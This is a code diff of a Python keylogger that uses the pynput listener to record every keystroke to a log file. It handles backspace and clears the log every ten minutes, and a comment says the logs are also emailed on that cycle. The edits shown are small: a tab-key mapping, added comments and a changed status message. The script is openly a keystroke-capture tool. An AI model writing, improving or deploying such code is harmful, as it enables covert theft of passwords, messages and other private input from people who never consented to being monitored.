@@ -6,7 +6,7 @@ from threading import Thread
 CYCLE = 60*10 # Time interval to Email and Clean Logs. (10 Minutes)
 FILENAME = "log.txt" # Filename.
 finished = False # Global Track to see if Log is finished.
-ReplaceCode = {Key.space: ' ', Key.enter: '\n'} # Dict Containing Non-alpha keys.
+ReplaceCode = {Key.space: ' ', Key.enter: '\n', Key.tab: ' '} # Dict Containing Non-alpha keys.
 
 # Key Press.
 def on_press(key):
@@ -19,7 +19,7 @@ def on_press(key):
         text = ReplaceCode[key]
     elif key == Key.backspace: # Remove last character in file if backspace was read.
         with open(FILENAME, 'rb+') as file:
-            file.seek(-1, os.SEEK_END)
+            file.seek(-1, os.SEEK_END) # Seeks the character before the last.
             file.truncate() # Remove the last character.
 
     # Write to file if text is valid.
@@ -43,10 +43,12 @@ def IntervalFileCls():
             clean_file(FILENAME)
             StartTime = time.time() # Reset Start Time.
 
+# Clears the file.
 def clean_file(file):
     open(file, 'w').close()
     print("\n FILE IS CLEANED \n")
 
+# Writes to the file.
 def write_file(file, input):
     with open(file, 'a') as file:
         file.write(input)
@@ -65,7 +67,7 @@ def main():
 
         if not listener.running:  # If Listener is no longer running, it is finished.
             finished = True
-            print("\nIt is finished.\n")
+            print("\nFinished.\n")
 
 
 # Execute if it is the main module.
